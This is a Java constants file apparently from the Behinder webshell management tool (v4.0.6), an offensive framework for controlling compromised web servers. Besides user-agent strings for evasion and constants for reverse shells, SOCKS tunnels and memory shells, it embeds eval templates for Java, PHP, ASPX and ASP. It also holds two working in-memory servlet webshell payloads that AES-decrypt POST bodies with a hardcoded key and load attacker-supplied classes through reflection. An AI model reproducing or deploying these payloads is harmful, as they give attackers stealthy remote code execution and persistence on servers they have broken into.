package net.rebeyond.behinder.core;

public class Constants {
   public static String[] userAgents = new String[]{"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0", "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"};
   public static String[] accepts = new String[]{"application/json, text/javascript, */*; q=0.01", "*/*1"};
   public static String TIP_FOR_VERSION = "保留版权是对原创基本的尊重：）";
   public static String VERSION = "v4.0.6 ";
   public static String AUTHOR = "By rebeyond";
   public static int MENU_CUT = 1;
   public static int MENU_COPY = 16;
   public static int MENU_PASTE = 256;
   public static int MENU_CLEAR = 4096;
   public static int MENU_SELECT_ALL = 65536;
   public static int MENU_ALL = 69905;
   public static int ENCRYPT_TYPE_AES = 0;
   public static int ENCRYPT_TYPE_XOR = 1;
   public static int ENCRYPT_TYPE_CUSTOMIZED = 2;
   public static int ENCRYPT_TYPE_RAW = 3;
   public static int REALCMD_RUNNING = 0;
   public static int REALCMD_STOPPED = 1;
   public static int PROXY_ENABLE = 0;
   public static int PROXY_DISABLE = 1;
   public static int COLUMN_DATA_TYPE_INT = 0;
   public static int COLUMN_DATA_TYPE_STRING = 1;
   public static int FILE_TYPE_DIRECTORY = 0;
   public static int FILE_TYPE_FILE = 1;
   public static final int SCRIPT_TYPE_ASP = 0;
   public static final int SCRIPT_TYPE_ASPX = 1;
   public static final int SCRIPT_TYPE_PHP = 2;
   public static final int SCRIPT_TYPE_JAVA = 3;
   public static int PLUGIN_TYPE_SCAN = 0;
   public static int PLUGIN_TYPE_EXPLOIT = 1;
   public static int PLUGIN_TYPE_TOOL = 2;
   public static int PLUGIN_TYPE_OTHER = 3;
   public static int OS_TYPE_WINDOWS = 0;
   public static int OS_TYPE_LINUX = 1;
   public static int OS_TYPE_UNIX = 2;
   public static int OS_TYPE_MAC = 3;
   public static int HISTORY_DIRECTION_UP = 0;
   public static int HISTORY_DIRECTION_DOWN = 1;
   public static int SHELL_STATUS_ALIVE = 0;
   public static int SHELL_STATUS_DEAD = 1;
   public static int LIST_STAGE_STARTED = 0;
   public static int LIST_STAGE_DONE = 1;
   public static int LIST_STAGE_FAIL = 2;
   public static int MEMSHELL_TYPE_FILE = 0;
   public static int MEMSHELL_TYPE_AGENT = 1;
   public static int MEMSHELL_TYPE_FILTER = 2;
   public static int MEMSHELL_TYPE_SERVLET = 3;
   public static String[] cookieProperty = new String[]{"expires", "max-age", "domain", "path", "secure", "httponly", "samesite"};
   public static int MAGIC_NUM = 5;
   public static int HTTP_TIME_OUT = 30;
   public static String[] BSHELL_CMDS = new String[]{"exec", "info", "list", "show", "download", "upload", "portmap", "socks"};
   public static int FILE_BLOCK_MAX_SIZE = 30720;
   public static int TUNNEL_TYPE_PORTMAP_LOCAL = 0;
   public static int TUNNEL_TYPE_PORTMAP_REMOTE = 1;
   public static int TUNNEL_TYPE_SOCKS_LOCAL = 2;
   public static int TUNNEL_TYPE_SOCKS_REMOTE = 3;
   public static int TUNNEL_TYPE_PORTMAP_REVERSE = 4;
   public static int TUNNEL_STATUS_DEAD = 0;
   public static int TUNNEL_STATUS_ALIVE = 1;
   public static int BSHELL_TYPE_TCP = 0;
   public static int BSHELL_TYPE_HTTP = 1;
   public static int BSHELL_TYPE_TCP_REVERSE = 2;
   public static int BSHELL_TYPE_HTTP_REVERSE = 3;
   public static int BSHELL_STATUS_DEAD = 0;
   public static int BSHELL_STATUS_ALIVE = 1;
   public static int BOOL_FALSE = 0;
   public static int BOOL_TRUE = 1;
   public static int COMPARE_MODE_RAW = 0;
   public static int COMPARE_MODE_NUM = 1;
   public static int COMPARE_MODE_BYTES = 2;
   public static String[] IMAGE_EXT_ARRAY = new String[]{"bmp", "dib", "pcp", "dif", "wmf", "gif", "jpg", "jpeg", "tif", "eps", "psd", "cdr", "iff", "tga", "pcd", "mpt", "png"};
   public static String JAVA_EVAL_CODE_ENCRYPT_TEMPLATE = "import javax.servlet.ServletOutputStream;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletResponse;\nimport javax.servlet.http.HttpSession;\nimport javax.servlet.jsp.PageContext;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n\n    private Object Request;\n    private Object Response;\n    private Object Session;\n\n    @Override\n    public boolean equals(Object obj) {\n\n        try {\n            fillContext(obj);\n            ServletOutputStream so = ((ServletResponse) Response).getOutputStream();\n            so.write(base64encode(%s(\"%s\".getBytes())).getBytes());\n            so.flush();\n            so.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return true;\n    }\n\n    private void fillContext(Object obj) throws Exception {\n        if (obj.getClass().getName().indexOf(\"PageContext\") >= 0) {\n            this.Request = obj.getClass().getDeclaredMethod(\"getRequest\", new Class[] {}).invoke(obj);\n            this.Response = obj.getClass().getDeclaredMethod(\"getResponse\", new Class[] {}).invoke(obj);\n            this.Session = obj.getClass().getDeclaredMethod(\"getSession\", new Class[] {}).invoke(obj);\n        } else {\n            Map<String, Object> objMap = (Map<String, Object>) obj;\n            this.Session = objMap.get(\"session\");\n            this.Response = objMap.get(\"response\");\n            this.Request = objMap.get(\"request\");\n        }\n        Response.getClass().getDeclaredMethod(\"setCharacterEncoding\", new Class[] { String.class }).invoke(Response,\n                \"UTF-8\");\n    }\n    private static String base64encode(byte[] content) throws Exception {\n        String result=\"\";\n        String version = System.getProperty(\"java.version\");\n        if (version.compareTo(\"1.9\") >= 0) {\n            Class Base64 = Class.forName(\"java.util.Base64\");\n            Object Encoder = Base64.getMethod(\"getEncoder\", null).invoke(Base64, null);\n            result = (String) Encoder.getClass().getMethod(\"encodeToString\", byte[].class).invoke(Encoder, content);\n        } else {\n            Class Base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n            Object Encoder = Base64.newInstance();\n            result = (String) Encoder.getClass().getMethod(\"encode\", byte[].class).invoke(Encoder, content);\n\n            result = result.replace(\"\\n\", \"\").replace(\"\\r\", \"\");\n        }\n        return result;\n    }%s}";
   public static String JAVA_EVAL_CODE_DECRYPT_TEMPLATE = "import javax.servlet.ServletOutputStream;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletResponse;\nimport javax.servlet.http.HttpSession;\nimport javax.servlet.jsp.PageContext;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n\n    private Object Request;\n    private Object Response;\n    private Object Session;\n\n    @Override\n    public boolean equals(Object obj) {\n\n        try {\n            fillContext(obj);\n            ServletOutputStream so = ((ServletResponse) Response).getOutputStream();\n            so.write(%s(base64decode(\"%s\")));\n            so.flush();\n            so.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return true;\n    }\n\n    private void fillContext(Object obj) throws Exception {\n        if (obj.getClass().getName().indexOf(\"PageContext\") >= 0) {\n            this.Request = obj.getClass().getDeclaredMethod(\"getRequest\", new Class[] {}).invoke(obj);\n            this.Response = obj.getClass().getDeclaredMethod(\"getResponse\", new Class[] {}).invoke(obj);\n            this.Session = obj.getClass().getDeclaredMethod(\"getSession\", new Class[] {}).invoke(obj);\n        } else {\n            Map<String, Object> objMap = (Map<String, Object>) obj;\n            this.Session = objMap.get(\"session\");\n            this.Response = objMap.get(\"response\");\n            this.Request = objMap.get(\"request\");\n        }\n        Response.getClass().getDeclaredMethod(\"setCharacterEncoding\", new Class[] { String.class }).invoke(Response,\n                \"UTF-8\");\n    }\n    private byte[] base64decode(String text) throws Exception {\n        String version=System.getProperty(\"java.version\");\n        byte[] result = null;\n        try\n        {\n            if (version.compareTo(\"1.9\")>=0)\n            {\n                Class Base64=this.getClass().forName(\"java.util.Base64\");\n                Object Decoder=Base64.getMethod(\"getDecoder\", null).invoke(Base64, null);\n                result=(byte[]) Decoder.getClass().getMethod(\"decode\", String.class).invoke(Decoder, text);\n            }\n            else\n            {\n                Class Base64=this.getClass().forName(\"sun.misc.BASE64Decoder\");\n                Object Decoder=Base64.newInstance();\n                result=(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\",String.class).invoke(Decoder, text);\n            }\n        }\n        catch (Exception e)\n        {\n\n        }\n\n        return result;\n    }%s}";
   public static String PHP_EVAL_CODE_ENCRYPT_TEMPLATE = "echo(base64_encode(%s(\"%s\")));\n\n%s";
   public static String PHP_EVAL_CODE_DECRYPT_TEMPLATE = "echo(%s(base64_decode(\"%s\")));\n\n%s";
   public static String ASPX_EVAL_CODE_ENCRYPT_TEMPLATE = "using System;\nusing System.Web;\nusing System.Text;using System.Web.SessionState;\n\n    public class Eval\n    {\n        public HttpRequest Request;\n        public HttpResponse Response;\n        public HttpSessionState Session;\n\t\n\tpublic void eval(System.Web.UI.Page page)\n\t{\n\t\tthis.Response = page.Response;\n\t\tResponse.Write(Convert.ToBase64String(%s(Encoding.UTF8.GetBytes(\"%s\"))));  \n\t}\n%s  }";
   public static String ASPX_EVAL_CODE_DECRYPT_TEMPLATE = "using System;\nusing System.Web;\nusing System.Text;using System.Web.SessionState;\n\n    public class Eval\n    {\n        public HttpRequest Request;\n        public HttpResponse Response;\n        public HttpSessionState Session;\n\t\n\tpublic void eval(System.Web.UI.Page page)\n\t{\n\t\tthis.Response = page.Response;\n\t\tResponse.Write(Encoding.UTF8.GetString(%s(Convert.FromBase64String(\"%s\"))));  \n\t}\n%s  }";
   public static String ASP_EVAL_CODE_ENCRYPT_TEMPLATE = "response.write(Base64Encode(%s(\"%s\")))\n\n%s\nFunction Base64Encode(sText)\n    Dim oXML, oNode\n\n    Set oXML = CreateObject(\"Msxml2.DOMDocument.3.0\")\n    Set oNode = oXML.CreateElement(\"base64\")\n    oNode.dataType = \"bin.base64\"\n    oNode.nodeTypedValue =Stream_StringToBinary(sText)\n    If Mid(oNode.text,1,4)=\"77u/\" Then\n    oNode.text=Mid(oNode.text,5)\n    End If\n    Base64Encode = Replace(oNode.text, vbLf, \"\")\n    Set oNode = Nothing\n    Set oXML = Nothing\nEnd Function\n\nFunction Stream_StringToBinary(Text)\n  Const adTypeText = 2\n  Const adTypeBinary = 1\n  Dim BinaryStream 'As New Stream\n  Set BinaryStream = CreateObject(\"ADODB.Stream\")\n  BinaryStream.Type = adTypeText\n  BinaryStream.CharSet = \"utf-8\"\n  BinaryStream.Open\n  BinaryStream.WriteText Text\n  BinaryStream.Position = 0\n  BinaryStream.Type = adTypeBinary\n  BinaryStream.Position = 0\n  Stream_StringToBinary = BinaryStream.Read\n  Set BinaryStream = Nothing\nEnd Function";
   public static String ASP_EVAL_CODE_DECRYPT_TEMPLATE = "response.write(%s(Base64Decode(\"%s\")))\n\n%s\nFunction Base64Decode(ByVal vCode)\n    Dim oXML, oNode\n\n    Set oXML = CreateObject(\"Msxml2.DOMDocument.3.0\")\n    Set oNode = oXML.CreateElement(\"base64\")\n    oNode.dataType = \"bin.base64\"\n    oNode.text = vCode\n    Base64Decode = oNode.nodeTypedValue\n    Set oNode = Nothing\n    Set oXML = Nothing\nEnd Function";
   public static String JAVA_CODE_TEMPLATE_SHORT = "public class test{\n %s\n}";
   public static String CSHARP_CODE_TEMPLATE = "using System;\n\n    public class AES\n    {\n\t\n%s\n  }";
   public static String shellCode = "javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession session = request.getSession();\nString pathPattern=\"%s\";\nif (request.getRequestURI().matches(pathPattern))\n{\n\tjava.util.Map obj=new java.util.HashMap();\n\tobj.put(\"request\",request);\n\tobj.put(\"response\",response);\n\tobj.put(\"session\",session);\n    ClassLoader loader=this.getClass().getClassLoader();\n\tif (request.getMethod().equals(\"POST\"))\n\t{\n\t\ttry\n\t\t{\n\t\t\tString k=\"e45e329feb5d925b\";\n\t\t\tsession.putValue(\"u\",k);\n\t\t\t\n\t\t\tjava.lang.ClassLoader systemLoader=java.lang.ClassLoader.getSystemClassLoader();\n\t\t\tClass cipherCls=systemLoader.loadClass(\"javax.crypto.Cipher\");\n\n\t\t\tObject c=cipherCls.getDeclaredMethod(\"getInstance\",new Class[]{String.class}).invoke((java.lang.Object)cipherCls,new Object[]{\"AES\"});\n\t\t\tObject keyObj=systemLoader.loadClass(\"javax.crypto.spec.SecretKeySpec\").getDeclaredConstructor(new Class[]{byte[].class,String.class}).newInstance(new Object[]{k.getBytes(),\"AES\"});;\n\t\t\t       \n\t\t\tjava.lang.reflect.Method initMethod=cipherCls.getDeclaredMethod(\"init\",new Class[]{int.class,systemLoader.loadClass(\"java.security.Key\")});\n\t\t\tinitMethod.invoke(c,new Object[]{new Integer(2),keyObj});\n\n\t\t\tjava.lang.reflect.Method doFinalMethod=cipherCls.getDeclaredMethod(\"doFinal\",new Class[]{byte[].class});\njava.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();\nbyte[] buf = new byte[512];\nint length=request.getInputStream().read(buf);\nwhile (length>0)\n{\nbos.write(buf,0,length);\nlength=request.getInputStream().read(buf);\n}\n            byte[] requestBody=bos.toByteArray();\n\t\t\tbyte[] buf=(byte[])doFinalMethod.invoke(c,new Object[]{requestBody});\n\t\t\tjava.lang.reflect.Method defineMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});\n\t\t\tdefineMethod.setAccessible(true);\n\t\t\tjava.lang.reflect.Constructor constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]{java.lang.ClassLoader.class});\n\t\t\tconstructor.setAccessible(true);\n\t\t\tjava.lang.ClassLoader cl=(java.lang.ClassLoader)constructor.newInstance(new Object[]{loader});\n\t\t\tjava.lang.Class  c=(java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]{null,java.nio.ByteBuffer.wrap(buf),null});\n\t\t\tc.newInstance().equals(obj);\n\t\t}\n\n\t\tcatch(java.lang.Exception e)\n\t\t{\n\t\t   e.printStackTrace();\n\t\t}\n\t\tcatch(java.lang.Error error)\n\t\t{\n\t\terror.printStackTrace();\n\t\t}\n\t\treturn;\n\t}\t\n}\n";
   public static String shellCodeWithDecrypt = " javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$1;\n        javax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$2;\n        javax.servlet.http.HttpSession session = request.getSession();\n        String pathPattern=\"%s\";\n        if (request.getRequestURI().matches(pathPattern))\n        {\n            java.util.Map obj=new java.util.HashMap();\n            obj.put(\"request\",request);\n            obj.put(\"response\",response);\n            obj.put(\"session\",session);\n            ClassLoader loader=this.getClass().getClassLoader();\n            if (request.getMethod().equals(\"POST\"))\n            {\n                try\n                {\n                    String decryptClass=\"%s\";\n                    String decryptName=\"%s\";\n                    byte[] decryptBytes;\n                    java.io.ByteArrayOutputStream bos=new java.io.ByteArrayOutputStream();\n                    byte[] buff=new byte[1024];\n                    java.io.InputStream in=request.getInputStream();\n                    int length=in.read(buff);\n                    while (length>0)\n                    {\n                        bos.write(buff,0,length);\n                        length=in.read(buff);\n                    }\n                    bos.close();\n                    byte[] requestBody=bos.toByteArray();\n                    try {\n                        Class Base64 = loader.loadClass(\"sun.misc.BASE64Decoder\");\n                        Object Decoder = Base64.newInstance();\n                        decryptBytes=(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(Decoder, new Object[]{decryptClass});\n                    } catch (Throwable ex)\n                    {\n                        Class Base64 = loader.loadClass(\"java.util.Base64\");\n                        Object Decoder = Base64.getDeclaredMethod(\"getDecoder\",new Class[0]).invoke(null, new Object[0]);\n                        decryptBytes=(byte[])Decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(Decoder, new Object[]{decryptClass});\n                    }\n\n                    java.lang.reflect.Method defineMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});\n                    defineMethod.setAccessible(true);\n                    java.lang.reflect.Constructor constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]{java.lang.ClassLoader.class});\n                    constructor.setAccessible(true);\n                    java.lang.ClassLoader cl=(java.lang.ClassLoader)constructor.newInstance(new Object[]{loader});\n                    java.lang.Class  d=(java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]{null,java.nio.ByteBuffer.wrap(decryptBytes),null});\n                    java.lang.reflect.Method decryptMethod=d.getDeclaredMethod(decryptName, new Class[]{byte[].class});\n                    decryptMethod.setAccessible(true);\n                    byte[] buf=(byte[])decryptMethod.invoke(d.newInstance(),new Object[]{requestBody});\n                    java.lang.Class  c=(java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]{null,java.nio.ByteBuffer.wrap(buf),null});\n                    c.newInstance().equals(obj);\n                }\n\n                catch(java.lang.Exception e)\n                {\n                    e.printStackTrace();\n                }\n                catch(java.lang.Error error)\n                {\n                    error.printStackTrace();\n                }\n                return;\n            }\n        }";
}
